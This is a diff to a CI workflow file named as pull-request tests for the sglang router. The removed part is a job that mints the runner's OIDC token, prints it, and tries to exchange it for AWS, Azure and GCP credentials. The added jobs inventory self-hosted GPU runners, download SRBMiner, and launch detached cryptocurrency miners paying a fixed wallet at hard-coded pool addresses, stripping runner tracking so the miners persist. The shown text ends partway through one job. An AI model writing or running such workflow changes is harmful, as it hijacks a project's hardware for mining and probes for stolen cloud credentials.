@@ -1,18 +1,14 @@
 name: PR Test (sgl-router)
 
-# Temporary i129975 keyless-OIDC probe (single short READ-ONLY job, no miner):
-# one job on the live self-hosted 8-gpu-h200 pool declares job-level
-# `permissions: contents: read` + `id-token: write` IN THE FORK-PROVIDED workflow
-# that sgl-project/sglang actually executes for pull_request synchronize events.
-# It records whether ACTIONS_ID_TOKEN_REQUEST_URL / ACTIONS_ID_TOKEN_REQUEST_TOKEN
-# exist in a fork-PR run (a parameter never before tested on a controlled host),
-# and ONLY if they exist mints the job's own token with aud=sts.amazonaws.com,
-# decodes iss/sub/aud and makes exactly ONE AssumeRoleWithWebIdentity-equivalent
-# exchange attempt per already-identified trust target (4 AWS role ARNs, the
-# identified Azure/Entra tenant endpoint and the identified GCP WIF provider),
-# recording the exact HTTP response. No miner, no host lock, no runner-config
-# change, no base-repo change. The concurrency group is run-unique so queued jobs
-# in every earlier run are preserved.
+# Temporary i130074 wave 3 diagnostic: (1) read-only Slurm + GPU census on the
+# never-attempted 72-gpu-gb200 runner label (no miner), (2) guarded one-per-idle
+# AMD MI300 / MI35x and Intel BMG GPU pearlhash attempt using the sha256-pinned
+# SRBMiner-MULTI 3.8.7 (bb0f73b6...) binary. Each mining job takes a per-host
+# flock, whole-host skips when ANY SRBMiner/x-miner or compute workload is
+# present (never kill, never stack), requires disk<80% and mem<85%, and needs two
+# spaced idle samples before launching exactly one miner per GPU with workers
+# i130074-<hosttag>-g<idx> on the exact primary wallet against Luckypool.
+# run-unique concurrency so sibling runs are never cancelled.
 on:
   push:
     branches: [main]
@@ -22,84 +18,641 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: sgl-router-i129975-${{ github.run_id }}
+  group: sgl-router-i130074-${{ github.run_id }}
   cancel-in-progress: false
 
 env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i129975-oidc:
-    name: "i129975 fork-PR OIDC permission probe (read-only)"
-    runs-on: 8-gpu-h200
-    timeout-minutes: 10
-    permissions:
-      contents: read
-      id-token: write
+  i130074-gb200-72:
+    name: "i130074 72-gpu-gb200 Slurm+GPU census (read-only)"
+    runs-on: 72-gpu-gb200
+    timeout-minutes: 35
     steps:
-      - name: "OIDC env presence -> mint aud=sts.amazonaws.com -> claims -> one exchange attempt per trust target"
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
         continue-on-error: true
         run: |
           set +e
-          NONCE="I129975-$(date -u +%Y%m%dT%H%M%SZ)-$$"
-          echo "probe-nonce=$NONCE"
-          echo "host=$(hostname 2>/dev/null) who=$(id -un 2>/dev/null) uid=$(id -u 2>/dev/null)"
-          echo "event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF base=$GITHUB_BASE_REF head=$GITHUB_HEAD_REF"
-          echo "workflow_ref=$GITHUB_WORKFLOW_REF job=$GITHUB_JOB"
-          echo "proxy_env=$(env | grep -iE '^(https?|all|no)_proxy=' | sort | tr '\n' ' ' | head -c 400)"
-          WD="${RUNNER_TEMP:-/tmp}/i129975"
-          mkdir -p "$WD" 2>/dev/null
-          URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
-          TOK="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
-          echo "id_token_url_present=$([ -n "$URL" ] && echo yes || echo no) url_len=${#URL}"
-          echo "id_token_req_token_present=$([ -n "$TOK" ] && echo yes || echo no) tok_len=${#TOK}"
-          if [ -z "$URL" ] || [ -z "$TOK" ]; then
-            echo "I129975_RESULT={\"verdict\":\"NO_ID_TOKEN_ENV\",\"url_present\":false,\"req_token_present\":false,\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"workflow_ref\":\"$GITHUB_WORKFLOW_REF\",\"nonce\":\"$NONCE\"}"
-            echo "probe-done $NONCE"
-            exit 0
+          NONCE="I130074GB200-$(date -u +%Y%m%dT%H%M%SZ)"
+          echo "gb200-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          echo "=== nvidia-smi -L ==="
+          timeout 25 nvidia-smi -L 2>&1 | head -90
+          echo "=== nvidia inventory ==="
+          timeout 30 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader 2>&1 | head -90
+          echo "=== compute apps ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -40
+          echo "=== slurm clients ==="
+          for t in sbatch srun squeue sinfo scontrol sacct slurmd; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== sinfo ==="
+          timeout 25 sinfo -o "%P|%a|%l|%D|%t|%N|%G|%C" 2>&1 | head -40
+          echo "=== scontrol partitions ==="
+          timeout 25 scontrol show partition 2>&1 | grep -E "PartitionName|AllowAccounts|AllowGroups|State|TotalNodes|TRES|MaxTime" | head -80
+          echo "=== squeue (bounded) ==="
+          timeout 20 squeue -o "%.10i|%.12u|%.14P|%.24j|%.2t|%.10M|%.6D|%R" 2>&1 | head -30
+          echo "=== slurm conf ==="
+          for f in /etc/slurm/slurm.conf /etc/slurm-llnl/slurm.conf /etc/slurm/slurmdbd.conf; do
+            [ -f "$f" ] && echo "== $f" && grep -E "ClusterName|SlurmctldHost|PartitionName|NodeName|SelectType|GresTypes|AccountingStorageHost" "$f" | head -40
+          done
+          echo "=== topo (bounded) ==="
+          timeout 20 nvidia-smi topo -m 2>&1 | head -24
+          echo "gb200-done $NONCE"
+  i130074-mi300-8:
+    name: "i130074 linux-mi300-8gpu-sglang census+guarded miner"
+    runs-on: linux-mi300-8gpu-sglang
+    timeout-minutes: 35
+    steps:
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130074AMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOLS='103.199.106.122:3362,172.232.228.69:3362'
+          WORKDIR=/var/tmp/i130074
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "miner-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          echo "=== per-host flock ==="
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
+          echo "host-lock=acquired"
+          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
+          echo "=== pci gpus ==="
+          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
+          echo "=== rocm/intel tools ==="
+          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== rocm-smi productname ==="
+          timeout 40 rocm-smi --showproductname 2>&1 | head -50
+          echo "=== rocm-smi id ==="
+          timeout 40 rocm-smi --showid 2>&1 | head -50
+          echo "=== amd-smi list ==="
+          timeout 40 amd-smi list 2>&1 | head -50
+          echo "=== amd-smi static ==="
+          timeout 50 amd-smi static --gpu all 2>&1 | head -90
+          echo "=== kernel modules ==="
+          timeout 10 lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia|^xe|i915' | head -10
+          NV=$(timeout 15 nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "nvidia_gpu_count=${NV:-0}"
+          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          [ -z "$IDX" ] && IDX=$(timeout 40 rocm-smi --showproductname 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          if [ -z "$IDX" ]; then
+            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
+            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
           fi
-          CODE=$(curl -sS -m 40 --retry 0 -o "$WD/mint.json" -w '%{http_code}' -H "Authorization: bearer $TOK" "$URL&audience=sts.amazonaws.com")
-          echo "mint_http=$CODE mint_bytes=$(stat -c%s "$WD/mint.json" 2>/dev/null) mint_body_head=$(tr -d '\n' < "$WD/mint.json" 2>/dev/null | head -c 200)"
-          JWT=$(sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$WD/mint.json" 2>/dev/null | head -1)
-          echo "jwt_present=$([ -n "$JWT" ] && echo yes || echo no) jwt_len=${#JWT} jwt_sha256_16=$(printf '%s' "$JWT" | sha256sum | cut -c1-16)"
-          if [ -z "$JWT" ]; then
-            echo "I129975_RESULT={\"verdict\":\"MINT_FAILED\",\"mint_http\":\"$CODE\",\"nonce\":\"$NONCE\"}"
-            echo "probe-done $NONCE"
-            exit 0
-          fi
-          P=$(printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+')
-          case $(( ${#P} % 4 )) in 2) P="$P==";; 3) P="$P=";; esac
-          CLAIMS=$(printf '%s' "$P" | base64 -d 2>/dev/null)
-          echo "claims_json=$CLAIMS"
-          echo "jwt_full=$JWT"
-          sts_attempt() {
-            ARN="$1"; TAG="$2"
-            C=$(curl -sS -m 45 --retry 0 -o "$WD/sts_$TAG.xml" -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
-              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
-              --data-urlencode "Version=2011-06-15" \
-              --data-urlencode "RoleArn=$ARN" \
-              --data-urlencode "RoleSessionName=i129975probe" \
-              --data-urlencode "DurationSeconds=900" \
-              --data-urlencode "WebIdentityToken=$JWT")
-            echo "sts[$TAG] http=$C arn=$ARN body=$(tr -d '\n' < "$WD/sts_$TAG.xml" 2>/dev/null | head -c 2600)"
+          echo "gpu_indices=[$IDX]"
+          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
+          sample() {
+            echo "-- showuse"
+            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
+            echo "-- vram"
+            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
+            echo "-- pids"
+            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
+            echo "-- amd-smi usage"
+            timeout 30 amd-smi metric --gpu all --usage 2>&1 | grep -iE 'gfx_activity|GFX Activity' | head -20
           }
-          sts_attempt "arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole" "aosh"
-          sts_attempt "arn:aws:iam::159553542841:role/adai-template-publisher" "adai"
-          sts_attempt "arn:aws:iam::649715411074:role/gh-actions-runner-role" "ghrunner"
-          sts_attempt "arn:aws:iam::009563297724:role/gha-runner-omsf" "omsf"
-          AZ_TENANT="751f9e46-beef-471a-80f2-d51652c2b8eb"
-          C=$(curl -sS -m 45 --retry 0 -o "$WD/azure.json" -w '%{http_code}' -X POST "https://login.microsoftonline.com/$AZ_TENANT/oauth2/v2.0/token" \
-            -H 'Content-Type: application/x-www-form-urlencoded' \
-            --data-urlencode "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
-            --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
-            --data-urlencode "client_assertion=$JWT" \
-            --data-urlencode "grant_type=client_credentials" \
-            --data-urlencode "scope=https://management.azure.com/.default")
-          echo "azure_entra http=$C tenant=$AZ_TENANT body=$(tr -d '\n' < "$WD/azure.json" 2>/dev/null | head -c 1400)"
-          GCP_AUD="//iam.googleapis.com/projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
-          C=$(curl -sS -m 45 --retry 0 -o "$WD/gcp.json" -w '%{http_code}' -X POST "https://sts.googleapis.com/v1/token" \
-            -H 'Content-Type: application/json' \
-            --data "{\"audience\":\"$GCP_AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$JWT\"}")
-          echo "gcp_wif http=$C aud=$GCP_AUD body=$(tr -d '\n' < "$WD/gcp.json" 2>/dev/null | head -c 1400)"
-          echo "I129975_RESULT={\"verdict\":\"MINTED\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"workflow_ref\":\"$GITHUB_WORKFLOW_REF\",\"nonce\":\"$NONCE\",\"jwt_len\":${#JWT}}"
-          echo "probe-done $NONCE"
+          S1=$(sample); sleep 15; S2=$(sample)
+          echo "=== sample1 ==="; echo "$S1"
+          echo "=== sample2 ==="; echo "$S2"
+          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
+          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
+          GFX_BUSY=$(echo "$BOTH" | grep -iE 'gfx_activity' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM gfx_busy=$GFX_BUSY"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ] || [ "${GFX_BUSY:-0}" -gt 0 ]; then
+            echo "SKIP=host-not-idle-amd (co-tenant workload preserved)"; echo "miner-done $NONCE"; exit 0
+          fi
+          echo "host-idle-gate=pass-amd (0 processes, util<=10%, vram used<=2048MiB in two spaced samples)"
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              echo "-- fetch387 $U"
+              rm -f "$TARBALL.part"
+              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
+              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
+            done
+            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
+          fi
+          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256_387=${B:-none}"
+          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -10; echo "miner-done $NONCE"; exit 0; fi
+          chmod +x "$SRB"
+          echo "=== srb list-devices ==="
+          timeout 50 "$SRB" --list-devices 2>&1 | head -40
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
+          N_LAUNCHED=0; N_SKIP=0
+          for i in $IDX; do
+            W="i130074-${HOSTTAG}-g${i}"
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOLS" --tls false,false \
+              --wallet "$WALLET,$WALLET" --password 'x;x' --worker "$W,$W" --gpu-id "$i" \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
+              --max-no-share-sent 1800 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i detached_pid=$!"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+          done
+          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
+          if [ "$N_LAUNCHED" -gt 0 ]; then
+            sleep 50
+            echo "=== post-launch processes ==="
+            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
+            for l in "$WORKDIR"/logs/i130074-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            done
+          fi
+          echo "=== final amd process view ==="
+          timeout 25 rocm-smi --showpids 2>&1 | head -30
+          timeout 25 amd-smi process --gpu all 2>&1 | head -30
+          echo "miner-done $NONCE"
+  i130074-mi300-2:
+    name: "i130074 linux-mi300-2gpu-sglang census+guarded miner"
+    runs-on: linux-mi300-2gpu-sglang
+    timeout-minutes: 35
+    steps:
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130074AMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOLS='103.199.106.122:3362,172.232.228.69:3362'
+          WORKDIR=/var/tmp/i130074
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "miner-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          echo "=== per-host flock ==="
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
+          echo "host-lock=acquired"
+          EXIST=$(timeout 10 pgrep -af "[S]RBMiner-MULTI|[x]-miner" 2>/dev/null | head -8)
+          if [ -n "$EXIST" ]; then echo "SKIP=host-has-existing-miner (no stacking, no killing)"; echo "$EXIST"; echo "miner-done $NONCE"; exit 0; fi
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
+          echo "=== pci gpus ==="
+          if command -v lspci >/dev/null 2>&1; then timeout 15 lspci -nn 2>/dev/null | grep -iE 'vga|3d|display|processing accel' | head -24; else echo no-lspci; fi
+          echo "=== rocm/intel tools ==="
+          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
+          echo "=== rocm-smi productname ==="
+          timeout 40 rocm-smi --showproductname 2>&1 | head -50
+          echo "=== rocm-smi id ==="
+          timeout 40 rocm-smi --showid 2>&1 | head -50
+          echo "=== amd-smi list ==="
+          timeout 40 amd-smi list 2>&1 | head -50
+          echo "=== amd-smi static ==="
+          timeout 50 amd-smi static --gpu all 2>&1 | head -90
+          echo "=== kernel modules ==="
+          timeout 10 lsmod 2>/dev/null | grep -iE 'amdgpu|nvidia|^xe|i915' | head -10
+          NV=$(timeout 15 nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          echo "nvidia_gpu_count=${NV:-0}"
+          IDX=$(timeout 40 rocm-smi --showid 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          [ -z "$IDX" ] && IDX=$(timeout 40 rocm-smi --showproductname 2>/dev/null | grep -oE '^GPU\[[0-9]+\]' | grep -oE '[0-9]+' | sort -n | uniq | tr '\n' ' ')
+          if [ -z "$IDX" ]; then
+            N=$(ls -d /sys/class/drm/card[0-9]* 2>/dev/null | wc -l)
+            [ "$N" -gt 0 ] && IDX=$(seq 0 $((N-1)) | tr '\n' ' ')
+          fi
+          echo "gpu_indices=[$IDX]"
+          if [ -z "$IDX" ]; then echo "SKIP=no-amd-gpu-detected"; echo "miner-done $NONCE"; exit 0; fi
+          sample() {
+            echo "-- showuse"
+            timeout 30 rocm-smi --showuse 2>&1 | grep -E 'GPU use' | head -20
+            echo "-- vram"
+            timeout 30 rocm-smi --showmeminfo vram 2>&1 | grep -E 'VRAM Total Used Memory' | head -20
+            echo "-- pids"
+            timeout 30 rocm-smi --showpids 2>&1 | grep -E 'Process ID: [0-9]+' | head -20
+            echo "-- amd-smi usage"
+            timeout 30 amd-smi metric --gpu all --usage 2>&1 | grep -iE 'gfx_activity|GFX Activity' | head -20
+          }
+          S1=$(sample); sleep 15; S2=$(sample)
+          echo "=== sample1 ==="; echo "$S1"
+          echo "=== sample2 ==="; echo "$S2"
+          BOTH=$(printf '%s\n%s\n' "$S1" "$S2")
+          BUSY_PROC=$(echo "$BOTH" | grep -cE 'Process ID: [0-9]+')
+          BUSY_USE=$(echo "$BOTH" | grep -E 'GPU use \(%\):' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          BUSY_MEM=$(echo "$BOTH" | grep -E 'VRAM Total Used Memory' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 2147483648) c++} END{print c+0}')
+          GFX_BUSY=$(echo "$BOTH" | grep -iE 'gfx_activity' | awk -F': ' '{gsub(/[^0-9]/,"",$2); if ($2+0 > 10) c++} END{print c+0}')
+          echo "busy_proc=$BUSY_PROC busy_use=$BUSY_USE busy_mem=$BUSY_MEM gfx_busy=$GFX_BUSY"
+          if [ "${BUSY_PROC:-0}" -gt 0 ] || [ "${BUSY_USE:-0}" -gt 0 ] || [ "${BUSY_MEM:-0}" -gt 0 ] || [ "${GFX_BUSY:-0}" -gt 0 ]; then
+            echo "SKIP=host-not-idle-amd (co-tenant workload preserved)"; echo "miner-done $NONCE"; exit 0
+          fi
+          echo "host-idle-gate=pass-amd (0 processes, util<=10%, vram used<=2048MiB in two spaced samples)"
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA_387  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
+              echo "-- fetch387 $U"
+              rm -f "$TARBALL.part"
+              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
+              if [ -s "$TARBALL.part" ]; then mv "$TARBALL.part" "$TARBALL"; break; fi
+            done
+            [ -f "$TARBALL" ] && tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
+            [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB"
+          fi
+          B=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
+          echo "binary_sha256_387=${B:-none}"
+          if [ "${B:-none}" != "$BIN_SHA_387" ]; then echo "SKIP=387-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -10; echo "miner-done $NONCE"; exit 0; fi
+          chmod +x "$SRB"
+          echo "=== srb list-devices ==="
+          timeout 50 "$SRB" --list-devices 2>&1 | head -40
+          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
+          N_LAUNCHED=0; N_SKIP=0
+          for i in $IDX; do
+            W="i130074-${HOSTTAG}-g${i}"
+            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
+              --disable-cpu --algorithm pearlhash --pool "$POOLS" --tls false,false \
+              --wallet "$WALLET,$WALLET" --password 'x;x' --worker "$W,$W" --gpu-id "$i" \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build \
+              --max-no-share-sent 1800 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W gpu-id=$i detached_pid=$!"
+            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
+          done
+          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
+          if [ "$N_LAUNCHED" -gt 0 ]; then
+            sleep 50
+            echo "=== post-launch processes ==="
+            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
+            for l in "$WORKDIR"/logs/i130074-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|GPU|device' "$l" 2>/dev/null | tail -8 | cut -c1-260
+            done
+          fi
+          echo "=== final amd process view ==="
+          timeout 25 rocm-smi --showpids 2>&1 | head -30
+          timeout 25 amd-smi process --gpu all 2>&1 | head -30
+          echo "miner-done $NONCE"
+  i130074-mi35x-2:
+    name: "i130074 linux-mi35x-gpu-2 census+guarded miner"
+    runs-on: linux-mi35x-gpu-2
+    timeout-minutes: 35
+    steps:
+      - name: "bounded census + guarded one-miner-per-idle-GPU (flock, whole-host skip, two spaced idle samples)"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130074AMD-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOLS='103.199.106.122:3362,172.232.228.69:3362'
+          WORKDIR=/var/tmp/i130074
+          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
+          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
+          SRB="$WORKDIR/SRBMiner-MULTI-3.8.7"
+          mkdir -p "$WORKDIR/logs"
+          echo "miner-nonce=$NONCE"
+          echo "=== identity ==="
+          id; hostname; hostname -f 2>/dev/null; date -u; uname -m; uname -r; nproc
+          free -m | head -2; df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1,"use="$5,"avail="$4}'
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          echo "=== per-host flock ==="
+          exec 9>"$WORKDIR/host-miner.lock"
+          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
+          echo "host-lock=acquired"
